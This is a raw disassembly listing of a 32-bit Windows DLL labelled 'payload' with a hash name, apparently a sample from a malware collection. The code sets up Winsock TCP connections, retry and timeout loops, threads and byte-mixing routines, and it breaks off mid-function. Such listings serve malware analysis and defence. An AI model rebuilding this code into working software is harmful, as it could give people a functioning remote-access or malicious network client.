
payload_f8eccfebda8a1e0caabbe23a8b94d7ced980353a9b3673a4173e24958a3bdbb9:     file format pei-i386


Disassembly of section .text:

10001000 <.text>:
10001000:	55                   	push   %ebp
10001001:	8b ec                	mov    %esp,%ebp
10001003:	83 ec 6c             	sub    $0x6c,%esp
10001006:	56                   	push   %esi
10001007:	57                   	push   %edi
10001008:	6a 08                	push   $0x8
1000100a:	5f                   	pop    %edi
1000100b:	57                   	push   %edi
1000100c:	33 f6                	xor    %esi,%esi
1000100e:	8d 45 e0             	lea    -0x20(%ebp),%eax
10001011:	56                   	push   %esi
10001012:	50                   	push   %eax
10001013:	e8 12 cd 00 00       	call   0x1000dd2a
10001018:	8b 45 0c             	mov    0xc(%ebp),%eax
1000101b:	89 45 d0             	mov    %eax,-0x30(%ebp)
1000101e:	8b 43 14             	mov    0x14(%ebx),%eax
10001021:	83 c4 0c             	add    $0xc,%esp
10001024:	c7 45 e0 14 00 00 00 	movl   $0x14,-0x20(%ebp)
1000102b:	c7 45 f0 98 3a 00 00 	movl   $0x3a98,-0x10(%ebp)
10001032:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10001035:	c7 45 f8 4f 05 00 00 	movl   $0x54f,-0x8(%ebp)
1000103c:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
10001043:	39 75 f4             	cmp    %esi,-0xc(%ebp)
10001046:	74 37                	je     0x1000107f
10001048:	56                   	push   %esi
10001049:	56                   	push   %esi
1000104a:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000104d:	56                   	push   %esi
1000104e:	89 45 dc             	mov    %eax,-0x24(%ebp)
10001051:	8d 45 ec             	lea    -0x14(%ebp),%eax
10001054:	50                   	push   %eax
10001055:	6a 01                	push   $0x1
10001057:	8d 45 d8             	lea    -0x28(%ebp),%eax
1000105a:	50                   	push   %eax
1000105b:	ff 75 08             	pushl  0x8(%ebp)
1000105e:	89 7d d8             	mov    %edi,-0x28(%ebp)
10001061:	89 75 ec             	mov    %esi,-0x14(%ebp)
10001064:	ff 15 60 e2 00 10    	call   *0x1000e260
1000106a:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000106d:	83 f8 ff             	cmp    $0xffffffff,%eax
10001070:	0f 84 0d 01 00 00    	je     0x10001183
10001076:	39 7d ec             	cmp    %edi,-0x14(%ebp)
10001079:	0f 85 04 01 00 00    	jne    0x10001183
1000107f:	ff 15 40 e1 00 10    	call   *0x1000e140
10001085:	2b 43 34             	sub    0x34(%ebx),%eax
10001088:	3d 20 bf 02 00       	cmp    $0x2bf20,%eax
1000108d:	0f 87 10 01 00 00    	ja     0x100011a3
10001093:	56                   	push   %esi
10001094:	ff 75 f0             	pushl  -0x10(%ebp)
10001097:	8d 45 d0             	lea    -0x30(%ebp),%eax
1000109a:	56                   	push   %esi
1000109b:	50                   	push   %eax
1000109c:	6a 02                	push   $0x2
1000109e:	ff 15 8c e2 00 10    	call   *0x1000e28c
100010a4:	3d 02 01 00 00       	cmp    $0x102,%eax
100010a9:	75 13                	jne    0x100010be
100010ab:	39 75 f4             	cmp    %esi,-0xc(%ebp)
100010ae:	74 8c                	je     0x1000103c
100010b0:	8b 45 10             	mov    0x10(%ebp),%eax
100010b3:	c7 00 0a 00 00 00    	movl   $0xa,(%eax)
100010b9:	e9 be 00 00 00       	jmp    0x1000117c
100010be:	3b c6                	cmp    %esi,%eax
100010c0:	0f 85 92 00 00 00    	jne    0x10001158
100010c6:	8d 45 94             	lea    -0x6c(%ebp),%eax
100010c9:	50                   	push   %eax
100010ca:	ff 75 0c             	pushl  0xc(%ebp)
100010cd:	ff 75 08             	pushl  0x8(%ebp)
100010d0:	ff 15 6c e2 00 10    	call   *0x1000e26c
100010d6:	83 f8 ff             	cmp    $0xffffffff,%eax
100010d9:	0f 84 cf 00 00 00    	je     0x100011ae
100010df:	f6 45 94 01          	testb  $0x1,-0x6c(%ebp)
100010e3:	74 5b                	je     0x10001140
100010e5:	39 75 98             	cmp    %esi,-0x68(%ebp)
100010e8:	75 56                	jne    0x10001140
100010ea:	56                   	push   %esi
100010eb:	56                   	push   %esi
100010ec:	8d 45 c0             	lea    -0x40(%ebp),%eax
100010ef:	89 45 cc             	mov    %eax,-0x34(%ebp)
100010f2:	8d 45 e8             	lea    -0x18(%ebp),%eax
100010f5:	50                   	push   %eax
100010f6:	8d 45 ec             	lea    -0x14(%ebp),%eax
100010f9:	50                   	push   %eax
100010fa:	6a 01                	push   $0x1
100010fc:	8d 45 c8             	lea    -0x38(%ebp),%eax
100010ff:	50                   	push   %eax
10001100:	ff 75 08             	pushl  0x8(%ebp)
10001103:	89 7d c8             	mov    %edi,-0x38(%ebp)
10001106:	89 75 e8             	mov    %esi,-0x18(%ebp)
10001109:	89 75 ec             	mov    %esi,-0x14(%ebp)
1000110c:	ff 15 58 e2 00 10    	call   *0x1000e258
10001112:	83 f8 ff             	cmp    $0xffffffff,%eax
10001115:	0f 84 93 00 00 00    	je     0x100011ae
1000111b:	39 7d ec             	cmp    %edi,-0x14(%ebp)
1000111e:	75 20                	jne    0x10001140
10001120:	8b 45 e0             	mov    -0x20(%ebp),%eax
10001123:	40                   	inc    %eax
10001124:	39 45 c0             	cmp    %eax,-0x40(%ebp)
10001127:	75 17                	jne    0x10001140
10001129:	83 45 e0 03          	addl   $0x3,-0x20(%ebp)
1000112d:	81 7d f0 c8 af 00 00 	cmpl   $0xafc8,-0x10(%ebp)
10001134:	89 75 f4             	mov    %esi,-0xc(%ebp)
10001137:	73 07                	jae    0x10001140
10001139:	81 45 f0 e8 03 00 00 	addl   $0x3e8,-0x10(%ebp)
10001140:	f6 45 94 20          	testb  $0x20,-0x6c(%ebp)
10001144:	74 17                	je     0x1000115d
10001146:	8b 45 10             	mov    0x10(%ebp),%eax
10001149:	c7 45 f8 c9 04 00 00 	movl   $0x4c9,-0x8(%ebp)
10001150:	c7 00 0b 00 00 00    	movl   $0xb,(%eax)
10001156:	eb 24                	jmp    0x1000117c
10001158:	83 f8 01             	cmp    $0x1,%eax
1000115b:	74 61                	je     0x100011be
1000115d:	6a 10                	push   $0x10
1000115f:	ff 73 30             	pushl  0x30(%ebx)
10001162:	ff 15 38 e1 00 10    	call   *0x1000e138
10001168:	3d 02 01 00 00       	cmp    $0x102,%eax
1000116d:	0f 84 d0 fe ff ff    	je     0x10001043
10001173:	8b 45 10             	mov    0x10(%ebp),%eax
10001176:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
1000117c:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000117f:	5f                   	pop    %edi
10001180:	5e                   	pop    %esi
10001181:	c9                   	leave  
10001182:	c3                   	ret    
10001183:	8b 4d 10             	mov    0x10(%ebp),%ecx
10001186:	33 c0                	xor    %eax,%eax
10001188:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%ebp)
1000118c:	0f 94 c0             	sete   %al
1000118f:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
10001196:	89 01                	mov    %eax,(%ecx)
10001198:	ff 15 64 e2 00 10    	call   *0x1000e264
1000119e:	89 45 f8             	mov    %eax,-0x8(%ebp)
100011a1:	eb d9                	jmp    0x1000117c
100011a3:	8b 45 10             	mov    0x10(%ebp),%eax
100011a6:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
100011ac:	eb ce                	jmp    0x1000117c
100011ae:	ff 15 64 e2 00 10    	call   *0x1000e264
100011b4:	89 45 f8             	mov    %eax,-0x8(%ebp)
100011b7:	8b 45 10             	mov    0x10(%ebp),%eax
100011ba:	89 38                	mov    %edi,(%eax)
100011bc:	eb be                	jmp    0x1000117c
100011be:	8b 45 10             	mov    0x10(%ebp),%eax
100011c1:	89 30                	mov    %esi,(%eax)
100011c3:	eb b7                	jmp    0x1000117c
100011c5:	55                   	push   %ebp
100011c6:	8b ec                	mov    %esp,%ebp
100011c8:	83 e4 f8             	and    $0xfffffff8,%esp
100011cb:	81 ec ec 02 00 00    	sub    $0x2ec,%esp
100011d1:	53                   	push   %ebx
100011d2:	56                   	push   %esi
100011d3:	57                   	push   %edi
100011d4:	8d 84 24 68 01 00 00 	lea    0x168(%esp),%eax
100011db:	50                   	push   %eax
100011dc:	33 db                	xor    %ebx,%ebx
100011de:	68 02 02 00 00       	push   $0x202
100011e3:	89 5c 24 18          	mov    %ebx,0x18(%esp)
100011e7:	ff 15 50 e2 00 10    	call   *0x1000e250
100011ed:	85 c0                	test   %eax,%eax
100011ef:	74 0b                	je     0x100011fc
100011f1:	ff 15 4c e1 00 10    	call   *0x1000e14c
100011f7:	e9 a8 03 00 00       	jmp    0x100015a4
100011fc:	89 5c 24 18          	mov    %ebx,0x18(%esp)
10001200:	ff 15 7c e2 00 10    	call   *0x1000e27c
10001206:	8b 7d 08             	mov    0x8(%ebp),%edi
10001209:	89 44 24 1c          	mov    %eax,0x1c(%esp)
1000120d:	3b c3                	cmp    %ebx,%eax
1000120f:	0f 84 24 02 00 00    	je     0x10001439
10001215:	68 00 20 00 00       	push   $0x2000
1000121a:	e8 c5 57 00 00       	call   0x100069e4
1000121f:	59                   	pop    %ecx
10001220:	89 44 24 20          	mov    %eax,0x20(%esp)
10001224:	3b c3                	cmp    %ebx,%eax
10001226:	75 0d                	jne    0x10001235
10001228:	c7 44 24 10 07 00 00 	movl   $0x7,0x10(%esp)
1000122f:	00 
10001230:	e9 1c 03 00 00       	jmp    0x10001551
10001235:	83 ce ff             	or     $0xffffffff,%esi
10001238:	c6 44 24 0f 02       	movb   $0x2,0xf(%esp)
1000123d:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
10001244:	00 
10001245:	83 fe ff             	cmp    $0xffffffff,%esi
10001248:	74 1b                	je     0x10001265
1000124a:	6a 02                	push   $0x2
1000124c:	56                   	push   %esi
1000124d:	ff 15 78 e2 00 10    	call   *0x1000e278
10001253:	56                   	push   %esi
10001254:	ff 15 84 e2 00 10    	call   *0x1000e284
1000125a:	68 98 3a 00 00       	push   $0x3a98
1000125f:	ff 15 44 e1 00 10    	call   *0x1000e144
10001265:	53                   	push   %ebx
10001266:	53                   	push   %ebx
10001267:	53                   	push   %ebx
10001268:	6a 06                	push   $0x6
1000126a:	6a 01                	push   $0x1
1000126c:	6a 02                	push   $0x2
1000126e:	ff 15 5c e2 00 10    	call   *0x1000e25c
10001274:	89 44 24 14          	mov    %eax,0x14(%esp)
10001278:	83 f8 ff             	cmp    $0xffffffff,%eax
1000127b:	0f 84 70 ff ff ff    	je     0x100011f1
10001281:	6a 02                	push   $0x2
10001283:	58                   	pop    %eax
10001284:	57                   	push   %edi
10001285:	66 89 44 24 44       	mov    %ax,0x44(%esp)
1000128a:	ff 15 54 e2 00 10    	call   *0x1000e254
10001290:	89 44 24 44          	mov    %eax,0x44(%esp)
10001294:	0f b7 47 10          	movzwl 0x10(%edi),%eax
10001298:	50                   	push   %eax
10001299:	ff 15 70 e2 00 10    	call   *0x1000e270
1000129f:	8b 35 68 e2 00 10    	mov    0x1000e268,%esi
100012a5:	66 89 44 24 42       	mov    %ax,0x42(%esp)
100012aa:	eb 19                	jmp    0x100012c5
100012ac:	38 5c 24 0f          	cmp    %bl,0xf(%esp)
100012b0:	0f 84 9b 02 00 00    	je     0x10001551
100012b6:	68 98 3a 00 00       	push   $0x3a98
100012bb:	ff 15 44 e1 00 10    	call   *0x1000e144
100012c1:	fe 4c 24 0f          	decb   0xf(%esp)
100012c5:	53                   	push   %ebx
100012c6:	53                   	push   %ebx
100012c7:	53                   	push   %ebx
100012c8:	53                   	push   %ebx
100012c9:	6a 10                	push   $0x10
100012cb:	8d 44 24 54          	lea    0x54(%esp),%eax
100012cf:	50                   	push   %eax
100012d0:	ff 74 24 2c          	pushl  0x2c(%esp)
100012d4:	ff d6                	call   *%esi
100012d6:	3b c3                	cmp    %ebx,%eax
100012d8:	75 d2                	jne    0x100012ac
100012da:	b8 b4 00 00 00       	mov    $0xb4,%eax
100012df:	66 89 84 24 b0 00 00 	mov    %ax,0xb0(%esp)
100012e6:	00 
100012e7:	6a 20                	push   $0x20
100012e9:	8d 47 38             	lea    0x38(%edi),%eax
100012ec:	50                   	push   %eax
100012ed:	8d 84 24 be 00 00 00 	lea    0xbe(%esp),%eax
100012f4:	50                   	push   %eax
100012f5:	c6 44 24 1b 02       	movb   $0x2,0x1b(%esp)
100012fa:	c7 84 24 be 00 00 00 	movl   $0x10001,0xbe(%esp)
10001301:	01 00 01 00 
10001305:	e8 06 ca 00 00       	call   0x1000dd10
1000130a:	8d 84 24 e2 00 00 00 	lea    0xe2(%esp),%eax
10001311:	83 c4 0c             	add    $0xc,%esp
10001314:	50                   	push   %eax
10001315:	33 f6                	xor    %esi,%esi
10001317:	e8 93 a2 00 00       	call   0x1000b5af
1000131c:	59                   	pop    %ecx
1000131d:	85 c0                	test   %eax,%eax
1000131f:	0f 84 2c 02 00 00    	je     0x10001551
10001325:	6a 10                	push   $0x10
10001327:	8d 84 24 5a 01 00 00 	lea    0x15a(%esp),%eax
1000132e:	8d b4 24 d9 00 00 00 	lea    0xd9(%esp),%esi
10001335:	59                   	pop    %ecx
10001336:	8a 90 60 ff ff ff    	mov    -0xa0(%eax),%dl
1000133c:	02 16                	add    (%esi),%dl
1000133e:	4e                   	dec    %esi
1000133f:	88 10                	mov    %dl,(%eax)
10001341:	40                   	inc    %eax
10001342:	49                   	dec    %ecx
10001343:	75 f1                	jne    0x10001336
10001345:	53                   	push   %ebx
10001346:	53                   	push   %ebx
10001347:	8d 84 24 b8 00 00 00 	lea    0xb8(%esp),%eax
1000134e:	53                   	push   %ebx
1000134f:	89 44 24 48          	mov    %eax,0x48(%esp)
10001353:	8d 44 24 30          	lea    0x30(%esp),%eax
10001357:	50                   	push   %eax
10001358:	33 f6                	xor    %esi,%esi
1000135a:	46                   	inc    %esi
1000135b:	56                   	push   %esi
1000135c:	8d 44 24 4c          	lea    0x4c(%esp),%eax
10001360:	50                   	push   %eax
10001361:	ff 74 24 2c          	pushl  0x2c(%esp)
10001365:	c7 44 24 54 b6 00 00 	movl   $0xb6,0x54(%esp)
1000136c:	00 
1000136d:	89 5c 24 40          	mov    %ebx,0x40(%esp)
10001371:	ff 15 60 e2 00 10    	call   *0x1000e260
10001377:	83 f8 ff             	cmp    $0xffffffff,%eax
1000137a:	0f 84 be 01 00 00    	je     0x1000153e
10001380:	81 7c 24 24 b6 00 00 	cmpl   $0xb6,0x24(%esp)
10001387:	00 
10001388:	0f 85 b0 01 00 00    	jne    0x1000153e
1000138e:	8b 44 24 20          	mov    0x20(%esp),%eax
10001392:	6a 21                	push   $0x21
10001394:	ff 74 24 20          	pushl  0x20(%esp)
10001398:	89 44 24 38          	mov    %eax,0x38(%esp)
1000139c:	ff 74 24 1c          	pushl  0x1c(%esp)
100013a0:	c7 44 24 38 00 20 00 	movl   $0x2000,0x38(%esp)
100013a7:	00 
100013a8:	ff 15 74 e2 00 10    	call   *0x1000e274
100013ae:	83 f8 ff             	cmp    $0xffffffff,%eax
100013b1:	0f 84 82 00 00 00    	je     0x10001439
100013b7:	53                   	push   %ebx
100013b8:	6a ff                	push   $0xffffffff
100013ba:	53                   	push   %ebx
100013bb:	8d 44 24 28          	lea    0x28(%esp),%eax
100013bf:	50                   	push   %eax
100013c0:	56                   	push   %esi
100013c1:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
100013c5:	ff 15 8c e2 00 10    	call   *0x1000e28c
100013cb:	85 c0                	test   %eax,%eax
100013cd:	0f 85 87 00 00 00    	jne    0x1000145a
100013d3:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
100013da:	50                   	push   %eax
100013db:	ff 74 24 20          	pushl  0x20(%esp)
100013df:	ff 74 24 1c          	pushl  0x1c(%esp)
100013e3:	ff 15 6c e2 00 10    	call   *0x1000e26c
100013e9:	83 f8 ff             	cmp    $0xffffffff,%eax
100013ec:	74 4b                	je     0x10001439
100013ee:	f6 84 24 84 00 00 00 	testb  $0x1,0x84(%esp)
100013f5:	01 
100013f6:	74 2e                	je     0x10001426
100013f8:	39 9c 24 88 00 00 00 	cmp    %ebx,0x88(%esp)
100013ff:	75 25                	jne    0x10001426
10001401:	53                   	push   %ebx
10001402:	53                   	push   %ebx
10001403:	8d 44 24 3c          	lea    0x3c(%esp),%eax
10001407:	50                   	push   %eax
10001408:	8d 44 24 34          	lea    0x34(%esp),%eax
1000140c:	50                   	push   %eax
1000140d:	56                   	push   %esi
1000140e:	8d 44 24 40          	lea    0x40(%esp),%eax
10001412:	50                   	push   %eax
10001413:	ff 74 24 2c          	pushl  0x2c(%esp)
10001417:	89 5c 24 50          	mov    %ebx,0x50(%esp)
1000141b:	ff 15 58 e2 00 10    	call   *0x1000e258
10001421:	83 f8 ff             	cmp    $0xffffffff,%eax
10001424:	74 22                	je     0x10001448
10001426:	f6 84 24 84 00 00 00 	testb  $0x20,0x84(%esp)
1000142d:	20 
1000142e:	74 2a                	je     0x1000145a
10001430:	8b 74 24 14          	mov    0x14(%esp),%esi
10001434:	e9 0c fe ff ff       	jmp    0x10001245
10001439:	ff 15 64 e2 00 10    	call   *0x1000e264
1000143f:	89 44 24 18          	mov    %eax,0x18(%esp)
10001443:	e9 09 01 00 00       	jmp    0x10001551
10001448:	83 4c 24 18 ff       	orl    $0xffffffff,0x18(%esp)
1000144d:	c7 44 24 10 08 00 00 	movl   $0x8,0x10(%esp)
10001454:	00 
10001455:	e9 f7 00 00 00       	jmp    0x10001551
1000145a:	ff 77 5c             	pushl  0x5c(%edi)
1000145d:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
10001461:	ff 77 58             	pushl  0x58(%edi)
10001464:	8b 44 24 38          	mov    0x38(%esp),%eax
10001468:	e8 74 87 00 00       	call   0x10009be1
1000146d:	59                   	pop    %ecx
1000146e:	59                   	pop    %ecx
1000146f:	85 c0                	test   %eax,%eax
10001471:	75 0d                	jne    0x10001480
10001473:	c7 44 24 10 02 00 00 	movl   $0x2,0x10(%esp)
1000147a:	00 
1000147b:	e9 d1 00 00 00       	jmp    0x10001551
10001480:	8b 44 24 30          	mov    0x30(%esp),%eax
10001484:	83 38 32             	cmpl   $0x32,(%eax)
10001487:	74 11                	je     0x1000149a
10001489:	89 74 24 18          	mov    %esi,0x18(%esp)
1000148d:	c7 44 24 10 04 00 00 	movl   $0x4,0x10(%esp)
10001494:	00 
10001495:	e9 b7 00 00 00       	jmp    0x10001551
1000149a:	83 c0 04             	add    $0x4,%eax
1000149d:	6a 32                	push   $0x32
1000149f:	50                   	push   %eax
100014a0:	8d 44 24 58          	lea    0x58(%esp),%eax
100014a4:	50                   	push   %eax
100014a5:	e8 66 c8 00 00       	call   0x1000dd10
100014aa:	83 c4 0c             	add    $0xc,%esp
100014ad:	39 74 24 50          	cmp    %esi,0x50(%esp)
100014b1:	74 32                	je     0x100014e5
100014b3:	83 7c 24 50 02       	cmpl   $0x2,0x50(%esp)
100014b8:	c7 44 24 10 06 00 00 	movl   $0x6,0x10(%esp)
100014bf:	00 
100014c0:	75 0d                	jne    0x100014cf
100014c2:	83 4c 24 18 ff       	orl    $0xffffffff,0x18(%esp)
100014c7:	c7 44 24 10 05 00 00 	movl   $0x5,0x10(%esp)
100014ce:	00 
100014cf:	83 7c 24 50 04       	cmpl   $0x4,0x50(%esp)
100014d4:	75 7b                	jne    0x10001551
100014d6:	83 4c 24 18 ff       	orl    $0xffffffff,0x18(%esp)
100014db:	c7 44 24 10 0d 00 00 	movl   $0xd,0x10(%esp)
100014e2:	00 
100014e3:	eb 6c                	jmp    0x10001551
100014e5:	8b 47 24             	mov    0x24(%edi),%eax
100014e8:	3b c3                	cmp    %ebx,%eax
100014ea:	74 0b                	je     0x100014f7
100014ec:	0f b7 4f 10          	movzwl 0x10(%edi),%ecx
100014f0:	51                   	push   %ecx
100014f1:	57                   	push   %edi
100014f2:	ff 77 28             	pushl  0x28(%edi)
100014f5:	ff d0                	call   *%eax
100014f7:	66 8b 44 24 58       	mov    0x58(%esp),%ax
100014fc:	8b 35 40 e1 00 10    	mov    0x1000e140,%esi
10001502:	66 89 47 10          	mov    %ax,0x10(%edi)
10001506:	8b 44 24 6e          	mov    0x6e(%esp),%eax
1000150a:	89 47 18             	mov    %eax,0x18(%edi)
1000150d:	ff d6                	call   *%esi
1000150f:	89 47 2c             	mov    %eax,0x2c(%edi)
10001512:	ff d6                	call   *%esi
10001514:	8b df                	mov    %edi,%ebx
10001516:	89 47 34             	mov    %eax,0x34(%edi)
10001519:	e8 56 08 00 00       	call   0x10001d74
1000151e:	89 47 30             	mov    %eax,0x30(%edi)
10001521:	8d 44 24 10          	lea    0x10(%esp),%eax
10001525:	50                   	push   %eax
10001526:	ff 74 24 20          	pushl  0x20(%esp)
1000152a:	ff 74 24 1c          	pushl  0x1c(%esp)
1000152e:	e8 cd fa ff ff       	call   0x10001000
10001533:	83 c4 0c             	add    $0xc,%esp
10001536:	89 44 24 18          	mov    %eax,0x18(%esp)
1000153a:	33 db                	xor    %ebx,%ebx
1000153c:	eb 13                	jmp    0x10001551
1000153e:	33 c9                	xor    %ecx,%ecx
10001540:	83 f8 ff             	cmp    $0xffffffff,%eax
10001543:	0f 94 c1             	sete   %cl
10001546:	8d 0c 8d 04 00 00 00 	lea    0x4(,%ecx,4),%ecx
1000154d:	89 4c 24 10          	mov    %ecx,0x10(%esp)
10001551:	ff 74 24 20          	pushl  0x20(%esp)
10001555:	e8 b9 54 00 00       	call   0x10006a13
1000155a:	59                   	pop    %ecx
1000155b:	6a 02                	push   $0x2
1000155d:	ff 74 24 18          	pushl  0x18(%esp)
10001561:	ff 15 78 e2 00 10    	call   *0x1000e278
10001567:	ff 74 24 14          	pushl  0x14(%esp)
1000156b:	ff 15 84 e2 00 10    	call   *0x1000e284
10001571:	ff 74 24 1c          	pushl  0x1c(%esp)
10001575:	ff 15 4c e2 00 10    	call   *0x1000e24c
1000157b:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
1000157f:	74 16                	je     0x10001597
10001581:	8b 47 1c             	mov    0x1c(%edi),%eax
10001584:	3b c3                	cmp    %ebx,%eax
10001586:	74 0f                	je     0x10001597
10001588:	ff 74 24 10          	pushl  0x10(%esp)
1000158c:	0f b7 4f 10          	movzwl 0x10(%edi),%ecx
10001590:	51                   	push   %ecx
10001591:	57                   	push   %edi
10001592:	ff 77 20             	pushl  0x20(%edi)
10001595:	ff d0                	call   *%eax
10001597:	ff 77 30             	pushl  0x30(%edi)
1000159a:	ff 15 50 e1 00 10    	call   *0x1000e150
100015a0:	8b 44 24 18          	mov    0x18(%esp),%eax
100015a4:	5f                   	pop    %edi
100015a5:	5e                   	pop    %esi
100015a6:	5b                   	pop    %ebx
100015a7:	8b e5                	mov    %ebp,%esp
100015a9:	5d                   	pop    %ebp
100015aa:	c2 04 00             	ret    $0x4
100015ad:	55                   	push   %ebp
100015ae:	8b ec                	mov    %esp,%ebp
100015b0:	51                   	push   %ecx
100015b1:	56                   	push   %esi
100015b2:	57                   	push   %edi
100015b3:	33 ff                	xor    %edi,%edi
100015b5:	6a 60                	push   $0x60
100015b7:	89 7d fc             	mov    %edi,-0x4(%ebp)
100015ba:	e8 25 54 00 00       	call   0x100069e4
100015bf:	59                   	pop    %ecx
100015c0:	ff 75 08             	pushl  0x8(%ebp)
100015c3:	8b f0                	mov    %eax,%esi
100015c5:	ff 15 34 e1 00 10    	call   *0x1000e134
100015cb:	83 f8 10             	cmp    $0x10,%eax
100015ce:	72 03                	jb     0x100015d3
100015d0:	6a 0f                	push   $0xf
100015d2:	58                   	pop    %eax
100015d3:	50                   	push   %eax
100015d4:	ff 75 08             	pushl  0x8(%ebp)
100015d7:	56                   	push   %esi
100015d8:	e8 33 c7 00 00       	call   0x1000dd10
100015dd:	66 8b 45 0c          	mov    0xc(%ebp),%ax
100015e1:	83 c4 0c             	add    $0xc,%esp
100015e4:	68 c0 e2 00 10       	push   $0x1000e2c0
100015e9:	57                   	push   %edi
100015ea:	6a 01                	push   $0x1
100015ec:	57                   	push   %edi
100015ed:	66 89 46 10          	mov    %ax,0x10(%esi)
100015f1:	ff 15 48 e1 00 10    	call   *0x1000e148
100015f7:	6a 20                	push   $0x20
100015f9:	ff 75 10             	pushl  0x10(%ebp)
100015fc:	89 46 14             	mov    %eax,0x14(%esi)
100015ff:	8d 46 38             	lea    0x38(%esi),%eax
10001602:	50                   	push   %eax
10001603:	e8 08 c7 00 00       	call   0x1000dd10
10001608:	ff 75 18             	pushl  0x18(%ebp)
1000160b:	e8 d4 53 00 00       	call   0x100069e4
10001610:	89 46 58             	mov    %eax,0x58(%esi)
10001613:	ff 75 18             	pushl  0x18(%ebp)
10001616:	ff 75 14             	pushl  0x14(%ebp)
10001619:	50                   	push   %eax
1000161a:	e8 f1 c6 00 00       	call   0x1000dd10
1000161f:	8b 45 18             	mov    0x18(%ebp),%eax
10001622:	89 46 5c             	mov    %eax,0x5c(%esi)
10001625:	8b 45 1c             	mov    0x1c(%ebp),%eax
10001628:	83 c4 1c             	add    $0x1c,%esp
1000162b:	89 46 20             	mov    %eax,0x20(%esi)
1000162e:	8b 45 20             	mov    0x20(%ebp),%eax
10001631:	89 46 28             	mov    %eax,0x28(%esi)
10001634:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001637:	50                   	push   %eax
10001638:	57                   	push   %edi
10001639:	56                   	push   %esi
1000163a:	68 c5 11 00 10       	push   $0x100011c5
1000163f:	57                   	push   %edi
10001640:	57                   	push   %edi
10001641:	c7 46 1c f1 16 00 10 	movl   $0x100016f1,0x1c(%esi)
10001648:	c7 46 24 38 17 00 10 	movl   $0x10001738,0x24(%esi)
1000164f:	ff 15 54 e1 00 10    	call   *0x1000e154
10001655:	3b c7                	cmp    %edi,%eax
10001657:	75 0d                	jne    0x10001666
10001659:	ff 76 14             	pushl  0x14(%esi)
1000165c:	ff 15 50 e1 00 10    	call   *0x1000e150
10001662:	33 c0                	xor    %eax,%eax
10001664:	eb 0a                	jmp    0x10001670
10001666:	50                   	push   %eax
10001667:	ff 15 50 e1 00 10    	call   *0x1000e150
1000166d:	8b 46 14             	mov    0x14(%esi),%eax
10001670:	5f                   	pop    %edi
10001671:	5e                   	pop    %esi
10001672:	c9                   	leave  
10001673:	c3                   	ret    
10001674:	55                   	push   %ebp
10001675:	8b ec                	mov    %esp,%ebp
10001677:	ff 75 08             	pushl  0x8(%ebp)
1000167a:	ff 15 3c e1 00 10    	call   *0x1000e13c
10001680:	68 d0 07 00 00       	push   $0x7d0
10001685:	ff 15 44 e1 00 10    	call   *0x1000e144
1000168b:	ff 75 08             	pushl  0x8(%ebp)
1000168e:	ff 15 50 e1 00 10    	call   *0x1000e150
10001694:	33 c0                	xor    %eax,%eax
10001696:	5d                   	pop    %ebp
10001697:	c3                   	ret    
10001698:	55                   	push   %ebp
10001699:	8b ec                	mov    %esp,%ebp
1000169b:	33 c9                	xor    %ecx,%ecx
1000169d:	89 50 30             	mov    %edx,0x30(%eax)
100016a0:	8b 55 08             	mov    0x8(%ebp),%edx
100016a3:	89 48 08             	mov    %ecx,0x8(%eax)
100016a6:	89 50 34             	mov    %edx,0x34(%eax)
100016a9:	89 08                	mov    %ecx,(%eax)
100016ab:	89 48 04             	mov    %ecx,0x4(%eax)
100016ae:	89 48 40             	mov    %ecx,0x40(%eax)
100016b1:	89 48 0c             	mov    %ecx,0xc(%eax)
100016b4:	89 48 38             	mov    %ecx,0x38(%eax)
100016b7:	89 48 3c             	mov    %ecx,0x3c(%eax)
100016ba:	5d                   	pop    %ebp
100016bb:	c2 04 00             	ret    $0x4
100016be:	55                   	push   %ebp
100016bf:	8b ec                	mov    %esp,%ebp
100016c1:	8b 06                	mov    (%esi),%eax
100016c3:	85 c0                	test   %eax,%eax
100016c5:	74 07                	je     0x100016ce
100016c7:	50                   	push   %eax
100016c8:	e8 46 53 00 00       	call   0x10006a13
100016cd:	59                   	pop    %ecx
100016ce:	8b 45 08             	mov    0x8(%ebp),%eax
100016d1:	89 06                	mov    %eax,(%esi)
100016d3:	8b 45 0c             	mov    0xc(%ebp),%eax
100016d6:	89 46 04             	mov    %eax,0x4(%esi)
100016d9:	e8 08 3b 00 00       	call   0x100051e6
100016de:	33 d2                	xor    %edx,%edx
100016e0:	f7 76 08             	divl   0x8(%esi)
100016e3:	33 c0                	xor    %eax,%eax
100016e5:	40                   	inc    %eax
100016e6:	89 56 38             	mov    %edx,0x38(%esi)
100016e9:	5d                   	pop    %ebp
100016ea:	c2 08 00             	ret    $0x8
100016ed:	33 c0                	xor    %eax,%eax
100016ef:	40                   	inc    %eax
100016f0:	c3                   	ret    
100016f1:	55                   	push   %ebp
100016f2:	8b ec                	mov    %esp,%ebp
100016f4:	8b 4d 08             	mov    0x8(%ebp),%ecx
100016f7:	33 c0                	xor    %eax,%eax
100016f9:	3b c8                	cmp    %eax,%ecx
100016fb:	74 37                	je     0x10001734
100016fd:	83 7d 14 09          	cmpl   $0x9,0x14(%ebp)
10001701:	74 03                	je     0x10001706
10001703:	ff 41 3c             	incl   0x3c(%ecx)
10001706:	83 7d 14 0d          	cmpl   $0xd,0x14(%ebp)
1000170a:	74 06                	je     0x10001712
1000170c:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
10001710:	75 06                	jne    0x10001718
10001712:	ff 41 38             	incl   0x38(%ecx)
10001715:	89 41 3c             	mov    %eax,0x3c(%ecx)
10001718:	83 79 3c 03          	cmpl   $0x3,0x3c(%ecx)
1000171c:	7e 06                	jle    0x10001724
1000171e:	ff 41 38             	incl   0x38(%ecx)
10001721:	89 41 3c             	mov    %eax,0x3c(%ecx)
10001724:	8b 51 38             	mov    0x38(%ecx),%edx
10001727:	3b 51 08             	cmp    0x8(%ecx),%edx
